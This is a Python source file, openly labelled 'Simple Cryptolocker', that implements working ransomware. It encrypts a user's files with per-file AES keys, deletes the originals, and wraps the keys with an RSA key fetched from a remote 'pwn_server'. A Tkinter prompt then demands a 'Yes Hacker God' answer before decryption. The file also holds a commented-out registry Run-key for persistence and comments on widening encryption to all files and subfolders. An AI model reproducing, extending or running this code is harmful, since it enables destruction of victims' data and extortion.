#Author Quentin Mayo

# Program : Simple Cryptolocker in python

import requests,urllib,json,_winreg,os,glob,csv,random,string,ast,time
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Tkinter import *

# Check for configurations
glob_config= None
try:

    glob_config = json.loads( open("config.js").read())
    if(set(glob_config.keys()) != set([ "pwn_server_public_key_url", "pwn_server_private_key_url",
    "file_encrypt_ext"])):
        raise Exception("Missing some keys. Closing Program")
except IOError: print "Sorry, can't find config file. Closing program"


# Thanks to http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
# For the ASE implementation
def pad(s): return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo: plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo: fo.write(enc)

def decrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:fo.write(dec)


# encryption of all the documents in a given path
def pwn_documents(path):
    return_key_list = []

    #Get all the files
    for file_ in glob.glob(path+"/*"):
        filename, file_extension = os.path.splitext(file_)

        #Change to capture all the files, just don't add .enc, you don't want be double encrypt some fiels but
        if(file_extension  in glob_config[u'file_encrypt_ext'] ):


            #Generate a random key
            key_to_file = os.urandom(16)
            return_key_list.append([key_to_file,file_])
            encrypt_file( file_,key_to_file)#decrypt_file('to_enc.txt.enc', key)
            os.remove(file_)
    return return_key_list


def unpwn_pwn():

    rsa_private_key = None
    while rsa_private_key == None:
        try:
            rsa_private_key_response = requests.post(glob_config[u'pwn_server_private_key_url'], data=json.dumps({"pwncoins":"5Kb8kLf9zgWQnogidDA76MzPL6TsZZY36hWXMssSzNydYXYB9KF","extra":"asd"}), headers={'content-type': 'application/json'})
            rsa_private_key = rsa_private_key_response.content
        except Exception:
            print "Request Failed for Private Key Failed"
            time.sleep(1)


    RSA_2 =  RSA.importKey( rsa_private_key)

    # Search through all files
    for each in glob.glob("*.enc"):

        #Eval is unsafe but it will be ok for now
        result  = RSA_2.decrypt(ast.literal_eval(str(open(each).read())))
        pwned_files = eval(result)
        # key , file
        #Decrypt files
        for decrypt_f in pwned_files:
            try:

                decrypt_file(decrypt_f[1]+".enc",decrypt_f[0])
                os.remove(decrypt_f[1]+".enc")
            except Exception:
                print "No File"
        os.remove(each)

    sys.exit(0)

#Show message
def message():

    #Set up a Simple UI
    root = Tk()
    w = Label(root, text="Click yes to unlock files")
    w.pack()
    var = StringVar(root)
    save_me_option = "Yes Hacker God."
    var.set(save_me_option) # initial value
    option = OptionMenu(root, var, save_me_option, "No(Don't Click Me)")
    option.pack()


    oops =None
    def result():
        #Options
        if(var.get() == save_me_option):
            unpwn_pwn()
            oops = Tk()
            label1= Label(oops, text="See, that wasn't that hard. . .")
            label1.pack()
        else:
            oops = Tk()
            label1= Label(oops, text="Don't click No")
            label1.pack()

    button = Button(root, text="OK", command=result)
    button.pack()
    root.mainloop()
def main():
    # Always Run this program code
    #key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',_winreg.KEY_SET_VALUE)#Write Key
    #_winreg.SetValueEx(key,'pytest',0,_winreg.REG_BINARY,'C:\random_safe_file.py') #House Cleaning
    #key.Close()

    rsa_public_key = None

    # For safety, I added a while to make so make sure your server is up
    while rsa_public_key == None:

        try:
            rsa_public_key_response = requests.post(glob_config[u'pwn_server_public_key_url'], data=json.dumps({}), headers={'content-type': 'application/json'})
            rsa_public_key = rsa_public_key_response.content
        except Exception:
            print "Request Failed"
            time.sleep(1)



    userhome = os.path.expanduser('~')

    #Change to system path ('.'), to encrypt all the files
    desktop = userhome + '/Desktop/test/'

    #Encrypt all documents at top directory
    #Returns keys that show a mapping to all the files together
    key_list = pwn_documents(desktop)

    #Recurively encrypt all files
    for root, dirs, files in  os.walk(desktop):
        for dir_ in dirs :key_list+=pwn_documents(root+dir_)
        break # Remove break to get all subdirectories


    # Building key files to bring back the encrypted documents
    if(len(key_list)  > 0):

        #load public key to RSA
        RSA_ = RSA.importKey(rsa_public_key)

        # Safety Measure, generate different file so key all the old keys
        random_out_text  =''.join(random.choice(string.lowercase) for x in range(10))

        #Write file
        f = open(random_out_text+".enc","wb")
        f.write(str(RSA_.encrypt(str(key_list),1)))
        f.close()

    #Show pwn Message
    message()


if __name__ == "__main__":
    main()
